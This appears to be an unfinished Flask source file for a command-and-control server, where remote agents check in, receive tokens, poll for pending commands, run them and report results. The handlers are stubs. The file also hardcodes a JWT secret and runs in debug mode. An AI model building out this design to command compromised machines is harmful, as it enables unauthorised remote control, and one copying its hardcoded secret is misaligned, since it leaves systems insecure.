from flask import Flask, jsonify, request
from flask_jwt_extended import (
    JWTManager, jwt_required, create_access_token,
    get_jwt_identity
)
import json
import sys

app = Flask(__name__)

app.config['JWT_SECRET_KEY'] = 'dawoof7123'
jwt = JWTManager(app)



@app.route('/first_check_in', methods = ['POST'])
def first_checkin():
	print(request)
	headers = request.headers
	print(headers)
	if not request.is_json:
		return jsonify({"msg":"missing json content type...exiting"})





def auth(username,password):
	print("auth")
	'''
	if password == "whatever":
	print("authenicate then give JWT token")
	access_token = create_access_token(identity=username)
    return jsonify(access_token=access_token), 200
    '''



'''
	IF AUTH WORKS, PERFORM FIRST CHECK_IN
	FIRST CHECK_IN SENDS INITIAL DATA TO DATABASE
	AFTER THAT AGENT WILL POLL THIS APPLICATION ON THE /polling route
	for new commands


AGENT -> POST -> /first_check_in
^^^
Agent first checks in, he authenticates now hes in the database and can be controlled via the cli app
he is assigned a token that is used for subesquent requests

AGENT -> GET -> /polling 

Agent is now polling this app every 5 seconds waiting for something to show in the pending commands array
if something is there agent will run that command 

AGENT -> POST ->/polling
after a command is gotten via the get request if it is successfully ran it will 
POST the results of the command to the database via POST request to poll 

then it will go back to polling /get via get

'''
@app.route("/polling",methods = ['POST','GET'])
def polling():
	print("if GET check for pending commands, IF POST post command results")








app.run(debug=True,port=9000)
#ssl_context='adhoc'